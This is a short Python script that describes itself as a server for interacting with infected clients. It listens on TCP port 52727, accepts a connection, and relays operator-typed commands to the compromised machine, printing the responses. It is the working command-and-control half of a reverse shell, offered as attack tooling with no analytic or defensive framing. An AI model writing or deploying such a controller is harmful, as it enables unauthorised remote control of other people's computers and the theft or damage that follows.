# Server for interacting with infected clients
# Listens for incoming connections on port 52727

import socket

# Define some constants
HOST = '' # Listen on all interfaces
PORT = 52727 # Listen on port 52727

# Create a TCP/IP socket to listen for incoming connections on 
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind((HOST, PORT))
print("Listening for incoming connections on port " + str(PORT))
s.listen(1) # Listen for one connection at a time, will refuse others until we accept the current one (for now)

# Accept a connection
conn, addr = s.accept()
print('Connection from', addr)

# Enter a loop to send commands to the client and receive responses
while True:
    # Get a command from the user
    cmd = input('Enter a command (or "exit" to quit): ')
    # If cmd is 'exit', exit the loop
    if cmd == 'exit':
        break
    # Send the command to the client
    conn.send(cmd.encode())
    # Receive the response from the client
    data = conn.recv(4096)
    # Print the response
    print(data.decode())

# Close the connection and socket
conn.close()
s.close()